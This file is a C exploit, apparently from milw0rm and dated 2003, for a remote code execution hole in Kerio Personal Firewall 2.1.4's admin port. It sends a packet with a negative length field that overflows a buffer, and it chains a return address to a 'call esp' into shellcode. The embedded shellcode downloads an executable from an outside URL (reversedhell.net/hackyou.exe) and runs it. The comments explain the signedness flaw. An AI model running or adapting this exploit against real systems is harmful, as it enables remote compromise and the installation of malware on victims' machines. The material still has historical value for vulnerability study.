/*
 * Kerio Personal Firewall v2.1.4 remote code execution exploit 
 * Tested on Windows XP with SP1
 * 
 * In order to exploit, for ease of mind, set the firewall to permit all traffic, or allow
 * a connection to port 44334 from your testing unix shell ip.
 * 
 * It is also possible to use UDP instead of TCP
 * 
 * It works out very well, if not, hit a few times with a ret addr of 0x41414141 to make it crash 
 * AT THAT addr. Then use the original one, it will work. The one I used points to a 'call esp'
 * inside the RPCRT4.DLL.
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <netdb.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>

#define PORT 44334 // the port client will be connecting to, default Kerio admin port 
#define retpos 5272	
#define MAXDATASIZE 5277 // max number of bytes we can get, also size of buffer

// global vars

struct sockaddr_in their_addr; // connector's address information 
char buf[MAXDATASIZE];
int numbytes;

unsigned char shellcode[] =
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
  
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
  
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
  "\xEB\x30\x5F\xFC\x8B\xF7\x80"
  
"\x3F\x08\x75\x03\x80\x37\x08\x47\x80\x3F\x01\x75\xF2\x8B\xE6\x33\xD2\xB2\x04\xC1"
  
"\xE2\x08\x2B\xE2\x8B\xEC\x33\xD2\xB2\x03\xC1\xE2\x08\x2B\xE2\x54\x5A\xB2\x7C\x8B"
  
"\xE2\xEB\x02\xEB\x57\x89\x75\xFC\x33\xC0\xB4\x40\xC1\xE0\x08\x89\x45\xF8\x8B\x40"
  
"\x3C\x03\x45\xF8\x8D\x40\x7E\x8B\x40\x02\x03\x45\xF8\x8B\xF8\x8B\x7F\x0C\x03\x7D"
  
"\xF8\x81\x3F\x4B\x45\x52\x4E\x74\x07\x83\xC0\x14\x8B\xF8\xEB\xEB\x50\x8B\xF8\x33"
  
"\xC9\x33\xC0\xB1\x10\x8B\x17\x03\x55\xF8\x52\xEB\x03\x57\x8B\xD7\x80\x7A\x03\x80"
  
"\x74\x16\x8B\x32\x03\x75\xF8\x83\xC6\x02\xEB\x02\xEB\x7E\x8B\x7D\xFC\x51\xF3\xA6"
  
"\x59\x5F\x74\x06\x40\x83\xC7\x04\xEB\xDB\x5F\x8B\x7F\x10\x03\x7D\xF8\xC1\xE0\x02"
  
"\x03\xF8\x8B\x07\x8B\x5D\xFC\x8D\x5B\x11\x53\xFF\xD0\x89\x45\xF4\x8B\x40\x3C\x03"
  
"\x45\xF4\x8B\x70\x78\x03\x75\xF4\x8D\x76\x1C\xAD\x03\x45\xF4\x89\x45\xF0\xAD\x03"
  
"\x45\xF4\x89\x45\xEC\xAD\x03\x45\xF4\x89\x45\xE8\x8B\x55\xEC\x8B\x75\xFC\x8D\x76"
  
"\x1E\x33\xDB\x33\xC9\xB1\x0F\x8B\x3A\x03\x7D\xF4\x56\x51\xF3\xA6\x59\x5E\x74\x06"
  
"\x43\x8D\x52\x04\xEB\xED\xD1\xE3\x8B\x75\xE8\x03\xF3\x33\xC9\x66\x8B\x0E\xEB\x02"
  
"\xEB\x7D\xC1\xE1\x02\x03\x4D\xF0\x8B\x09\x03\x4D\xF4\x89\x4D\xE4\x8B\x5D\xFC\x8D"
  
"\x5B\x2D\x33\xC9\xB1\x07\x8D\x7D\xE0\x53\x51\x53\x8B\x55\xF4\x52\x8B\x45\xE4\xFC"
  
"\xFF\xD0\x59\x5B\xFD\xAB\x8D\x64\x24\xF8\x38\x2B\x74\x03\x43\xEB\xF9\x43\xE2\xE1"
  
"\x8B\x45\xE0\x53\xFC\xFF\xD0\xFD\xAB\x33\xC9\xB1\x04\x8D\x5B\x0C\xFC\x53\x51\x53"
  
"\x8B\x55\xC4\x52\x8B\x45\xE4\xFF\xD0\x59\x5B\xFD\xAB\x38\x2B\x74\x03\x43\xEB\xF9"
  
"\x43\xE2\xE5\xFC\x33\xD2\xB6\x1F\xC1\xE2\x08\x52\x33\xD2\x52\x8B\x45\xD4\xFF\xD0"
  
"\x89\x45\xB0\x33\xD2\xEB\x02\xEB\x77\x52\x52\x52\x52\x53\x8B\x45\xC0\xFF\xD0\x8D"
  
"\x5B\x03\x89\x45\xAC\x33\xD2\x52\xB6\x80\xC1\xE2\x10\x52\x33\xD2\x52\x52\x8D\x7B"
  
"\x09\x57\x50\x8B\x45\xBC\xFF\xD0\x89\x45\xA8\x8D\x55\xA0\x52\x33\xD2\xB6\x1F\xC1"
  
"\xE2\x08\x52\x8B\x4D\xB0\x51\x50\x8B\x45\xB8\xFF\xD0\x8B\x4D\xA8\x51\x8B\x45\xB4"
  
"\xFF\xD0\x8B\x4D\xAC\x51\x8B\x45\xB4\xFF\xD0\x33\xD2\x52\x53\x8B\x45\xDC\xFF\xD0"
  
"\x89\x45\xA4\x8B\x7D\xA0\x57\x8B\x55\xB0\x52\x50\x8B\x45\xD8\xFF\xD0\x8B\x55\xA4"
  
"\x52\x8B\x45\xD0\xFF\xD0\xEB\x02\xEB\x12\x33\xD2\x90\x52\x53\x8B\x45\xCC\xFF\xD0"
  
"\x33\xD2\x52\x8B\x45\xC8\xFF\xD0\xE8\xE6\xFD\xFF\xFF\x47\x65\x74\x4D\x6F\x64\x75"
  
"\x6C\x65\x48\x61\x6E\x64\x6C\x65\x41\x08\x6B\x65\x72\x6E\x65\x6C\x33\x32\x2E\x64"
  
"\x6C\x6C\x08\x47\x65\x74\x50\x72\x6F\x63\x41\x64\x64\x72\x65\x73\x73\x08\x4C\x6F"
  
"\x61\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x08\x5F\x6C\x63\x72\x65\x61\x74\x08\x5F"
  
"\x6C\x77\x72\x69\x74\x65\x08\x47\x6C\x6F\x62\x61\x6C\x41\x6C\x6C\x6F\x63\x08\x5F"
  
"\x6C\x63\x6C\x6F\x73\x65\x08\x57\x69\x6E\x45\x78\x65\x63\x08\x45\x78\x69\x74\x50"
  
"\x72\x6F\x63\x65\x73\x73\x08\x77\x69\x6E\x69\x6E\x65\x74\x2E\x64\x6C\x6C\x08\x49"
  
"\x6E\x74\x65\x72\x6E\x65\x74\x4F\x70\x65\x6E\x41\x08\x49\x6E\x74\x65\x72\x6E\x65"
  
"\x74\x4F\x70\x65\x6E\x55\x72\x6C\x41\x08\x49\x6E\x74\x65\x72\x6E\x65\x74\x52\x65"
  
"\x61\x64\x46\x69\x6C\x65\x08\x49\x6E\x74\x65\x72\x6E\x65\x74\x43\x6C\x6F\x73\x65"
  
"\x48\x61\x6E\x64\x6C\x65\x08\x4E\x53\x08\x6E\x73\x73\x63\x2E\x65\x78\x65\x08"
  "http://reversedhell.net/hackyou.exe"
  "\x08\x01"; // download + exec from the net ; donno who wrote this sc
  
  //change the url to whatever, this one pops up an innofensive message box

// end of global vars

int suck(int sock,int n) // painfull function to get rid of the painfull Kerio protocol
{
	int i=0,j=0,k,a=0,b=0,c=0,d=0;

	while (i<n)
	{

		if ((numbytes=recv(sock, buf, n, 0)) == -1) {
            	perror("recv");
            	exit(1);
	       }

        	if (j) i+=(numbytes-1); // ya i know i know :D
       
        	else i+=numbytes;

        	for (k=0;k<numbytes;k++) {
        					if (k % 10 == 0) fprintf(stderr,"\n");
        					if (buf[k]==0) fprintf(stderr,"    0 ");
        					else fprintf(stderr," %4.0d ",buf[k]);
        				     }	


        	fprintf(stderr,"    * ");
        	j++;
        	d=buf[numbytes];
        	c=buf[numbytes-1];
        	b=buf[numbytes-2];
        	a=buf[numbytes-3];
        	if ((i>200) && (a==0x1) && (b==0x0) && (c==0x1) && (d==0x0)) break;
        }
        fprintf(stderr,"\n");
        return i;
}


    int main(int argc, char *argv[])
    {
        int sockfd, i,j;  
        struct hostent *he;
 
        if (argc != 2) {
            fprintf(stderr,"usage: ./%s hostname\n",argv[0]);
            exit(1);
        }

        if ((he=gethostbyname(argv[1])) == NULL) {  // get the host info 
            perror("gethostbyname");
            exit(1);
        }

        if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) { // prepare a socket for connecting
            perror("socket");
            exit(1);
        }

        their_addr.sin_family = AF_INET;    // host byte order 
        their_addr.sin_port = htons(PORT);  // short, network byte order 
        their_addr.sin_addr = *((struct in_addr *)he->h_addr);
        memset(&(their_addr.sin_zero), '\0', 8);  // zero the rest of the struct 

        if (connect(sockfd, (struct sockaddr *)&their_addr,sizeof(struct sockaddr)) == -1) {
            perror("connect");
            exit(1);
        }
 
        
        fprintf(stderr,"shell len = %d\n",strlen(shellcode));
	 fprintf(stderr,"Connected to firewall.\n");
	 memset(buf,0x0,sizeof(buf));
	 fprintf(stderr,"Sucking buffer..\n");
        suck(sockfd,266);
        fprintf(stderr,"\nBuffer sucked by black hole..\n");
    	 memset(buf,0x0,sizeof(buf));
    	 fprintf(stderr,"-------------------------------------------------\n");
    	 fprintf(stderr,"                 - BANNER -   \n");
    	 fprintf(stderr,"-------------------------------------------------\n");
    	 sleep(1);
	 fprintf(stderr,"coded by Burebista (aanton@reversedhell.net)\n");
	 fprintf(stderr,"           released on - 5 Apr 2003 -\n");
	 
	 sleep(2);
    	 fprintf(stderr,"-------------------------------------------------\n");
	 memset(buf,0x90,MAXDATASIZE); // set nops all over
	 
	 // prepares call up to beginning of buffer 32 bit=5 bytes
	 buf[MAXDATASIZE-1]='\xff'; //
	 buf[MAXDATASIZE-2]='\xff'; // call -1150
	 buf[MAXDATASIZE-3]='\xee'; //
	 buf[MAXDATASIZE-4]='\xab'; //
	 buf[MAXDATASIZE-5]='\xe8'; //
	  						
	 j=0;
                   // insert the shellcode in buf at 900
	 for (i=900;j<strlen(shellcode);i++) buf[i]=shellcode[j++]; 
	 
	 // prepares the new return address (on XPSP1 it is CALL ESP in RPCRT4.DLL)
	
	 buf[retpos-1]='\x78';
	 buf[retpos-2]='\x07';
	 buf[retpos-3]='\x06';
	 buf[retpos-4]='\x90';
	 
	 // this prepares packet header with negative length 
	 
	 buf[0]=0;
	 buf[1]=0;
	 buf[2]=0x14;
	 buf[3]=0xffffff9c; // negative, -100. firewall will prepare
	                          // buf of that size. signed integers hit again
	/*
         The 4th byte in the packet is the size of what the firewall will be expecting to receive
        right ahead. If we send longer buffer then what we told the firewall to expect, it will be
        simply truncated and nothing cool will happen. The problem is Kerio never thought we could
        tell it something that stupid like we are going to send -100 bytes, it is like expecting a
        client to buy -20 books from your library, which is an absurdity. There is no checking to
        make sure the user input is valid. Again, invalid trusted user input. What they should have
        done is either to use the 4th byte inside a modulus, to make sure it is always positive,
        either lamingly check if it is negative, and if true, stop processing the inputted data.
                 	
            What's so funny?                   
	*/
	 
	 if ((send(sockfd, buf,sizeof(buf),0)) == -1 ) { // PASARAN! 
		perror("send");
		exit(1);
	 }
	 fprintf(stderr,"..pasaran...\n");
	 fprintf(stderr,":D Done!\n");
	 
        close(sockfd);
       }


// milw0rm.com [2003-05-08]
